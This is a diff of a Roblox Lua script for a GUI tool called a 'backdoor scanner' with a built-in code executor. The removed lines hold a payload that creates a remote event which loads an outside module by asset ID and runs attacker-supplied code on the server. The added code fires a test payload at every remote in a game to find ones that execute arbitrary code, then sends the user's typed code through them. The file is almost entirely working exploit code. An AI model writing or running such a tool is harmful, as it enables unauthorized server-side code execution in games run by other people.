-	local script = Instance.new('LocalScript', Main)
-
-	backdoorcode = ([[
-				rem = Instance.new('RemoteEvent', game:GetService('Players'):FindFirstChild('%s'))
-				rem.Name = 'myfatherleftme'
-				rem.OnServerEvent:Connect(function(plr, ss)
-				require(14382140693)(ss)()
-				end)
-				]]):format(game:GetService('Players').LocalPlayer.Name)
-	local attached = Instance.new('BoolValue')
-	attached.Name = 'Attached'
-	attached.Value = false
-	attached.Parent = script.Parent
-	local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	local JointsService = game:GetService("JointsService")
-	local StarterGui = game:GetService("StarterGui")
-	local dateTimeNow = DateTime.now
-	local tableFind = table.find
-	local taskSpawn = task.spawn
-	local taskWait = task.wait
-	local stringRep = string.rep
-	local LocalPlayer = game:GetService('Players').LocalPlayer
-	local function harked()
-		local backpack = LocalPlayer.Backpack 
-		return backpack:FindFirstChild("HandlessSegway") and
-			backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
-			backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
-	end
-	local function emmaBackdoor(rm)
-		local Parent = rm.Parent
-		return rm.Name == "emma" and Parent and Parent.Name == "mynameemma" and Parent.Parent == ReplicatedStorage
-	end
-	script.Parent.Attach.Activated:Connect(function()
-		local function validRemote(rm)
-			local Parent = rm.Parent
-	
-			if getfenv().blacklisted then
-				if tableFind(getfenv().blacklisted, rm:GetFullName()) then return false end
-			end
-			if Parent then
-				if Parent == JointsService then return false end
-	
-				-- Adonis Check
-				if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
-					(rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
-	
-				if (Parent.ClassName == "Folder" and Parent.Name == "DefaultChatSystemChatEvents" and Parent.Parent == ReplicatedStorage) then return false end
-			end
-	
-			if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
-	
-			return true
+end;
+task.spawn(C_9);
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Dragify
+local function C_e()
+local script = G2L["e"];
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+		dragToggle = nil
+		dragSpeed = 0.15
+		dragInput = nil
+		dragStart = nil
+		dragPos = nil
+		function updateInput(input)
+			Delta = input.Position - dragStart
+			Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.15), {Position = Position}):Play()
 		end
-		do
-			local DescendantsList = game:GetDescendants()
-			for index=1, #DescendantsList do
-				if attached.Value then break end
-				local remote = DescendantsList[index]
+		Frame.InputBegan:Connect(function(input)
+			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+				dragToggle = true
+				dragStart = input.Position
+				startPos = Frame.Position
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragToggle = false
+					end
+				end)
+			end
+		end)
+		Frame.InputChanged:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+				dragInput = input
+			end
+		end)
+		game:GetService("UserInputService").InputChanged:Connect(function(input)
+			if input == dragInput and dragToggle then
+				updateInput(input)
+			end
+		end)
+	end
+	dragify(script.Parent)
 	
-				if not validRemote(remote) then continue end
-				if remote.ClassName ~= "RemoteEvent" then continue end
+end;
+task.spawn(C_e);
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.Editor
+local function C_1d()
+local script = G2L["1d"];
+	-- edited with <3 by nosyliam
 	
-				if emmaBackdoor(remote) then
-					remote:FireServer(backdoorcode)
+	-- 1x1x1x1 was not here
+	
+	local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
+	local global_env = {"getrawmetatable", "game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16"}
+	
+	local Source = script.Parent:WaitForChild("Code")
+	local Lines = Source.Parent:WaitForChild("Lines")
+	local Scroll = script.Parent
+	
+	local Highlight = function(string, keywords)
+	    local K = {}
+	    local S = string
+	    local Token =
+	    {
+	        ["="] = true,
+	        ["."] = true,
+	        [","] = true,
+	        ["("] = true,
+	        [")"] = true,
+	        ["["] = true,
+	        ["]"] = true,
+	        ["{"] = true,
+	        ["}"] = true,
+	        [":"] = true,
+	        ["*"] = true,
+	        ["/"] = true,
+	        ["+"] = true,
+	        ["-"] = true,
+	        ["%"] = true,
+			[";"] = true,
+			["~"] = true
+	    }
+	    for i, v in pairs(keywords) do
+	        K[v] = true
+	    end
+	    S = S:gsub(".", function(c)
+	        if Token[c] ~= nil then
+	            return "\32"
+	        else
+	            return c
+	        end
+	    end)
+	    S = S:gsub("%S+", function(c)
+	        if K[c] ~= nil then
+	            return c
+	        else
+	            return (" "):rep(#c)
+	        end
+	    end)
+	  
+	    return S
+	end
+	
+	local hTokens = function(string)
+	    local Token =
+	    {
+	        ["="] = true,
+	        ["."] = true,
+	        [","] = true,
+	        ["("] = true,
+	        [")"] = true,
+	        ["["] = true,
+	        ["]"] = true,
+	        ["{"] = true,
+	        ["}"] = true,
+	        [":"] = true,
+	        ["*"] = true,
+	        ["/"] = true,
+	        ["+"] = true,
+	        ["-"] = true,
+	        ["%"] = true,
+			[";"] = true,
+			["~"] = true
+	    }
+	    local A = ""
+	    string:gsub(".", function(c)
+	        if Token[c] ~= nil then
+	            A = A .. c
+	        elseif c == "\n" then
+	            A = A .. "\n"
+			elseif c == "\t" then
+				A = A .. "\t"
+	        else
+	            A = A .. "\32"
+	        end
+	    end)
+	  
+	    return A
+	end
+	
+	
+	local strings = function(string)
+	    local highlight = ""
+	    local quote = false
+	    string:gsub(".", function(c)
+	        if quote == false and c == "\"" then
+	            quote = true
+	        elseif quote == true and c == "\"" then
+	            quote = false
+	        end
+	        if quote == false and c == "\"" then
+	            highlight = highlight .. "\""
+	        elseif c == "\n" then
+	            highlight = highlight .. "\n"
+			elseif c == "\t" then
+			    highlight = highlight .. "\t"
+	        elseif quote == true then
+	            highlight = highlight .. c
+	        elseif quote == false then
+	            highlight = highlight .. "\32"
+	        end
+	    end)
+	  
+	    return highlight
+	end
+	
+	local comments = function(string)
+	    local ret = ""
+	    string:gsub("[^\r\n]+", function(c)
+	        local comm = false
+	        local i = 0
+	        c:gsub(".", function(n)
+	            i = i + 1
+	            if c:sub(i, i + 1) == "--" then
+	                comm = true
+	            end
+	            if comm == true then
+	                ret = ret .. n
+	            else
+	                ret = ret .. "\84"
+	            end
+	        end)
+	        ret = ret
+	    end)
+	    
+	    return ret
+	end
+	
+	local numbers = function(string)
+	    local A = ""
+	    string:gsub(".", function(c)
+	        if tonumber(c) ~= nil then
+	            A = A .. c
+	        elseif c == "\n" then
+	            A = A .. "\n"
+			elseif c == "\t" then
+				A = A .. "\t"
+	        else
+	            A = A .. "\32"
+	        end
+	    end)
+	  
+	    return A
+	end
+	
+	local getCurrentLineLength = function()
+		local num = 0
+		repeat
+			num = num + 1
+		until string.sub(Source.Text, Source.CursorPosition - num, Source.CursorPosition - num) == "\n" or (Source.CursorPosition - num <= 0)
+		return num
+	end
+	
+	local getCurrentLine = function()
+		local lin = 1
+		Source.Text:sub(1, Source.CursorPosition):gsub("\n", function()
+			lin = lin + 1
+		end)
+		return lin
+	end
+	
+	local getNumLines = function()
+		local lin = 1
+		Source.Text:gsub("\n", function()
+			lin = lin + 1
+		end)
+		return lin
+	end
+	
+	local getLongestLine = function()
+		local longest, i = 0, 0
+		for line in Source.Text:gmatch("([^\r\n]*)[\r\n]?") do
+	  		longest = string.len(line) > longest and string.len(line) or longest
+		end
+		return longest
+	end
+	
+	local getLineInset = function()
+		local pos, lineInset = Source.CursorPosition, 0
+		repeat
+			pos = pos - 1
+			lineInset = lineInset + 1
+		until string.sub(Source.Text, pos, pos) == "\n" or pos <= 0
+		return lineInset
+	end
+	
+	local function Comments(String) -- Edit
+		local CommentaryOpen = false
+		String = String:gsub("%-%-",function(Commentary) return "\255" end)
+		String = String:gsub("\n",function(Commentary) return "\254" end)
+		return String:gsub("%S",function(Character)
+			if Character == "\255" then
+				CommentaryOpen = true
+				return "--"
+			elseif Character == "\254" then
+				CommentaryOpen = false
+				return "\n"
+			end
+			return CommentaryOpen and Character or "\32"
+		end)
+	end
+	
+	local highlight_source = function(type)
+		if type == "Text" or type == "CursorPosition" then
+			Source.Text = Source.Text:gsub("\13", "")
+			Source.Text = Source.Text:gsub("\t", "      ")
+			local s = Source.Text
+			Source.Keywords_.Text = Highlight(s, lua_keywords)
+			Source.Globals_.Text = Highlight(s, global_env)
+			Source.RemoteHighlight_.Text = Highlight(s, {"FireServer", "fireServer", "InvokeServer", "invokeServer"})
+			Source.Tokens_.Text = hTokens(s)
+			Source.Numbers_.Text = numbers(s)
+			Source.Strings_.Text = strings(s)
+			Source.Comments_.Text = Comments(s)
+			Lines.Text = ""
+			for i = 1, getNumLines() do
+				Lines.Text = Lines.Text .. i .. "\n"
+			end
+			--Lines.Size = UDim2.new(0, 26, 0, math.max(10000, (15 * getNumLines()) + 5))
+			Scroll.CanvasSize = UDim2.new(0, 8 * getLongestLine(), 0, (15 * getNumLines()) + 5)
+			if Scroll.CanvasPosition.X < (8 * getCurrentLineLength())-276 then
+				movedAway = false
+			end
+			local top = math.floor(Scroll.CanvasPosition.Y / 15) + 2
+			local bottom = math.min(top + 16, getNumLines())
+			if getCurrentLine() > bottom then
+				Scroll.CanvasPosition = Scroll.CanvasPosition + Vector2.new(0, 15)
+				if bottom == 15 then
+					Scroll.CanvasPosition = Scroll.CanvasPosition + Vector2.new(0, 5)
 				end
-				if attached.Value then
-					remote:FireServer(backdoorcode)
+			end
+			if getCurrentLine() < top then
+				Scroll.CanvasPosition = Scroll.CanvasPosition + Vector2.new(0, -15)
+			end
+			if movedAway then
+			elseif 8 * getCurrentLineLength() > 266 then
+				Scroll.CanvasPosition = Vector2.new((8 * getCurrentLineLength())-266, Scroll.CanvasPosition.Y)
+			else
+				Scroll.CanvasPosition = Vector2.new(0, Scroll.CanvasPosition.Y)
+			end
+			if getCurrentLine() == getNumLines() and Source.TextBounds.Y > 240 and (not scrolledAway) then
+				Scroll.CanvasPosition = Vector2.new(Scroll.CanvasPosition.X, (getNumLines() * 15) + 5)
+			end
+			--Source.Size = UDim2.new(0, math.max((getLongestLine() * 8), 266) + 4, 0, math.max(getNumLines() * 15, 250))
+			--Lines.Position = UDim2.new(0, 0, 0, -Scroll.CanvasPosition.Y)
+		end
+	end
+	
+	local move_lines = function(type)
+		if type == "CanvasPosition" then
+			Lines.Position = UDim2.new(0, 0, 0, -Scroll.CanvasPosition.Y)
+		end
+	end
+	
+	highlight_source("Text")
+	
+	Source.Changed:Connect(highlight_source)
+	Scroll.Changed:Connect(move_lines)
+	currentInset, movingUp, movingDown, scrolledAway, movedAway = 0, false, false, false, false
+	game:GetService("UserInputService").InputEnded:connect(function(inp)
+		if not Source:IsFocused() then highlight_source("Text") end
+		highlight_source("Text")
+		if inp.UserInputType == Enum.UserInputType.Keyboard then
+			if inp.KeyCode == Enum.KeyCode.Left then
+				currentInset = getLineInset()
+			elseif inp.KeyCode == Enum.KeyCode.Right then
+				currentInset = getLineInset()
+			elseif inp.KeyCode == Enum.KeyCode.Up then
+				movingUp = false
+			elseif inp.KeyCode == Enum.KeyCode.Down then
+				movingDown = false
+			end
+		end
+	end)
+	game:GetService("UserInputService").InputChanged:connect(function(inp)
+		if not Source:IsFocused() then return end
+		if inp.UserInputType == Enum.UserInputType.TextInput then
+			currentInset = getLineInset()
+		elseif inp.KeyCode == Enum.KeyCode.Left then
+			currentInset = getLineInset()
+		elseif inp.KeyCode == Enum.KeyCode.Right then
+			currentInset = getLineInset()
+		end
+		if inp.UserInputType == Enum.UserInputType.MouseWheel then
+			scrolledAway = true
+			Scroll.CanvasPosition = Scroll.CanvasPosition - Vector2.new(0, 15 * inp.Position.Z)
+		end
+	end)
+	game:GetService("UserInputService").InputBegan:connect(function(inp)
+		if inp.UserInputType == Enum.UserInputType.MouseButton1 then
+			currentInset = getLineInset()
+			if (inp.Position.X >= Scroll.AbsolutePosition.X + Scroll.AbsoluteSize.X - 5 and inp.Position.X <= Scroll.AbsolutePosition.X + Scroll.AbsoluteSize.X) then
+				scrolledAway = true
+				Source:ReleaseFocus()
+			end
+			if (inp.Position.Y >= Scroll.AbsolutePosition.Y + Scroll.AbsoluteSize.Y - 5 and inp.Position.Y <= Scroll.AbsolutePosition.Y + Scroll.AbsoluteSize.Y) then
+				movedAway = true
+				Source:ReleaseFocus()
+			end
+		end
+		if not Source:IsFocused() then return end
+		highlight_source("Text")
+		if inp.KeyCode == Enum.KeyCode.Return then
+			Scroll.CanvasPosition = Vector2.new(0, Scroll.CanvasPosition.Y)
+			scrolledAway = false
+			movedAway = false
+		elseif inp.KeyCode == Enum.KeyCode.Up then
+			movingUp = true
+			waitTime = 0.5
+			local function move()
+				local pos, pLen = Source.CursorPosition, 0
+				repeat
+					pos = pos - 1
+				until (string.sub(Source.Text, pos, pos) == "\n") or (0 >= pos) -- Go to end of line
+				if pos == 0 then wait(waitTime) return end
+				repeat -- Go to the start of the previous line
+					pos = pos - 1
+					pLen = pLen + 1
+				until (string.sub(Source.Text, pos, pos) == "\n") or (0 >= pos)
+				local inset = currentInset
+				Source.CursorPosition = pos + math.min(currentInset, pLen)
+				wait(waitTime)
+			end
+			move()
+			if movingUp == false then return end
+			waitTime = 0.05
+			repeat
+				move()
+			until movingUp == false
+		elseif inp.KeyCode == Enum.KeyCode.Down then
+			movingDown = true
+			waitTime = 0.5
+			local function move()
+				local pos, pLen = Source.CursorPosition, 0
+				repeat
+					pos = pos - 1
+				until string.sub(Source.Text, pos, pos) == "\n" or pos > string.len(Source.Text) or 0 >= pos
+				repeat -- Go to the start of the next line
+					pos = pos + 1
+				until string.sub(Source.Text, pos, pos) == "\n" or pos > string.len(Source.Text)
+				repeat -- Find length of the next line
+					pLen = pLen + 1
+				until string.sub(Source.Text, pos + pLen, pos + pLen) == "\n" or pos + pLen > string.len(Source.Text)
+				if pos == 0 then wait(waitTime) return end
+				local inset = currentInset
+				Source.CursorPosition = pos + math.min(currentInset, pLen)
+				wait(waitTime)
+			end
+			move()
+			if movingDown == false then return end
+			waitTime = 0.05
+			repeat
+				move()
+			until movingDown == false	
+		end
+	end)
+	
+	-- you really skidded off of topkek, huh
+	
+end;
+task.spawn(C_1d);
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.TextButton.LocalScript
+local function C_21()
+local script = G2L["21"];
+	script.Parent.Activated:Connect(function()
+		local rem = script.Parent.Parent.Remote.Value
+		if rem:IsA('RemoteEvent') then
+			rem:FireServer(script.Parent.Parent.Scroll.Code.Text)
+		else
+			rem:InvokeServer(script.Parent.Parent.Scroll.Code.Text)
+		end
+	end)
+end;
+task.spawn(C_21);
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.TextButton.LocalScript
+local function C_24()
+local script = G2L["24"];
+	script.Parent.Activated:Connect(function()
+		script.Parent.Text = "Scanning....."
+		local guid = game:GetService('HttpService'):GenerateGUID(false)
+		backdoorcode = ([[
+					local model = Instance.new('Model')
+					model.Name = '%s'
+					model.Parent=workspace
+					]]):format(game:GetService('Players').LocalPlayer.Name)
+		local attached = Instance.new('BoolValue')
+		attached.Name = 'Attached'
+		attached.Value = false
+		attached.Parent = script.Parent
+		local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local JointsService = game:GetService("JointsService")
+		local StarterGui = game:GetService("StarterGui")
+		local dateTimeNow = DateTime.now
+		local tableFind = table.find
+		local taskSpawn = task.spawn
+		local taskWait = task.wait
+		local stringRep = string.rep
+		local LocalPlayer = game:GetService('Players').LocalPlayer
+		local function harked()
+			local backpack = LocalPlayer.Backpack 
+			return backpack:FindFirstChild("HandlessSegway") and
+				backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
+				backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
+		end
+		local function emmaBackdoor(rm)
+			local Parent = rm.Parent
+			return rm.Name == "emma" and Parent and Parent.Name == "mynameemma" and Parent.Parent == ReplicatedStorage
+		end
+		script.Parent.Attach.Activated:Connect(function()
+			local function validRemote(rm)
+				local Parent = rm.Parent
+	
+				if getfenv().blacklisted then
+					if tableFind(getfenv().blacklisted, rm:GetFullName()) then return false end
+				end
+				if Parent then
+					if Parent == JointsService then return false end
+	
+					-- Adonis Check
+					if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
+						(rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
+	
+					if (Parent.ClassName == "Folder" and Parent.Name == "DefaultChatSystemChatEvents" and Parent.Parent == ReplicatedStorage) then return false end
 				end
 	
-				if not attached.Value then remote:FireServer(backdoorcode) end
-				if not attached.Value then remote:FireServer(backdoorcode) end
-				if not attached.Value then remote:FireServer(backdoorcode) end
-				wait()
-				if game:GetService('Players').LocalPlayer:FindFirstChild('myfatherleftme') then
+				if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
+	
+				return true
+			end
+			do
+				local DescendantsList = game:GetDescendants()
+				for index=1, #DescendantsList do
+					if attached.Value then break end
+					local remote = DescendantsList[index]
+	
+					if not validRemote(remote) then continue end
+					if remote.ClassName ~= "RemoteEvent" then continue end
+	
+					if emmaBackdoor(remote) then
+						remote:FireServer(backdoorcode)
+					end
+					if attached.Value then
+						remote:FireServer(backdoorcode)
+					end
+	
+					if not attached.Value then remote:FireServer(backdoorcode) end
+					if not attached.Value then remote:FireServer(backdoorcode) end
+					if not attached.Value then remote:FireServer(backdoorcode) end
+					wait()
+					if workspace:FindFirstChild(guid) then
+						attached.Value = true
+						script.Parent.AttachStatus.Text = 'Status: Attached'
+						return
+					end
+				end
+				if attached.Value then return end
+				taskWait(2)
+				if workspace:FindFirstChild(guid) then
+					attached.Value = true
+					script.Parent.AttachStatus.Text = 'Status: Attached'
+					return
+				end
+				for index=1, #DescendantsList do
+					if attached.Value then break end
+					local remote = DescendantsList[index]
+	
+					if not validRemote(remote) then continue end
+					if remote.ClassName ~= "RemoteFunction" then continue end
+	
+					local waiting = true
+					taskSpawn(function()
+						remote:InvokeServer(backdoorcode)
+						waiting = nil
+					end)
+	
+					-- If RemoteFunction don't respond in 1 second, we skip this one.
+					local start = dateTimeNow().UnixTimestampMillis
+					while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
+						taskWait()
+					end
+				end
+				taskWait(2)
+				if workspace:FindFirstChild(guid) then
 					attached.Value = true
 					script.Parent.AttachStatus.Text = 'Status: Attached'
 					return
 				end
 			end
-			if attached.Value then return end
-			taskWait(2)
-			if game:GetService('Players').LocalPlayer:FindFirstChild('myfatherleftme') then
+			if workspace:FindFirstChild(guid) then
 				attached.Value = true
 				script.Parent.AttachStatus.Text = 'Status: Attached'
 				return
 			end
-			for index=1, #DescendantsList do
-				if attached.Value then break end
-				local remote = DescendantsList[index]
-	
-				if not validRemote(remote) then continue end
-				if remote.ClassName ~= "RemoteFunction" then continue end
-	
-				local waiting = true
-				taskSpawn(function()
-					remote:InvokeServer(backdoorcode)
-					waiting = nil
-				end)
-	
-				-- If RemoteFunction don't respond in 1 second, we skip this one.
-				local start = dateTimeNow().UnixTimestampMillis
-				while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
-					taskWait()
-				end
-			end
-			taskWait(2)
-			if game:GetService('Players').LocalPlayer:FindFirstChild('myfatherleftme') then
-				attached.Value = true
-				script.Parent.AttachStatus.Text = 'Status: Attached'
-				return
-			end
-		end
-		if game:GetService('Players').LocalPlayer:FindFirstChild('myfatherleftme') then
-			attached.Value = true
-			script.Parent.AttachStatus.Text = 'Status: Attached'
-			return
-		end
+		end)
 	end)
-end
-coroutine.wrap(DQZGUYY_fake_script)()
+end;
+task.spawn(C_24);
+
+return G2L["1"], require;
